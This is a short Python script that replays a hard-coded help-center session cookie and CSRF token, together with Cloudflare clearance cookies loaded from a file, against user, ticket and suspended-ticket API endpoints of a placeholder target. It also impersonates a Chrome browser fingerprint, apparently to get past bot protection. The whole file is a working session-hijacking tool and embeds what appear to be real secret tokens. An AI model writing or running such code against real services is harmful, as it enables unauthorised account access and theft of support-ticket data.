import json
from curl_cffi import requests

cookie_dict = {}
try:
    with open("validation_logs/cf_cookies.txt", "r") as f:
        for line in f:
            if "=" in line:
                parts = line.strip().split(";")[0].split("=", 1)
                if len(parts) == 2:
                    cookie_dict[parts[0].strip()] = parts[1].strip()
except Exception as e:
    print(f"[-] Error loading cookies: {e}")

# Inject active help center session token
cookie_dict["_help_center_session"] = "Q3RsRlREcDdaRVBwVkVrUytKYTVZNG5UMjk0Z1lmNy9MVGZIc2xQY21WVHFmVGFTU1ROSUdsekNBK21sTFZxNXFjVGtYL3BMRGpnUUZTbzFjb3ErZW1XS0pwbUVhdlU3QU9FWjRWd1lLZjYzWkUwMU1yU0pDN0doWWNrQjYyRFZNWGRCOE9aZG14S09pU2YweURJcDBmWElKQjl2S2pJamVVbkdLek5OeWJqMERsQXNOOWVKaHc3WjZlVUJUZW5qLS1oeS9VY3pFMjF6ZXFJRWdmMGsvNG9RPT0%3D"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-CSRF-Token": "CrJO27lFe-PV8HbzGu9FXqOasX9715lJ9n1MqLld3eBGoFGiDrdgDdrM3VMGTYzeo",
    "X-Requested-With": "XMLHttpRequest"
}

endpoints = [
    "https://yourtarget.com/api/v2/users/me.json",
    "https://yourtarget.com/api/v2/requests.json",
    "https://yourtarget.com/api/v2/suspended_tickets.json"
]

for url in endpoints:
    print(f"[*] Testing session token against: {url}")
    try:
        res = requests.get(url, cookies=cookie_dict, headers=headers, impersonate="chrome120", timeout=10)
        print(f"    [+] Status Code: {res.status_code}")
        print(f"    [+] Response: {res.text[:300]}")
    except Exception as e:
        print(f"    [-] Error: {e}")
    print("-" * 50)
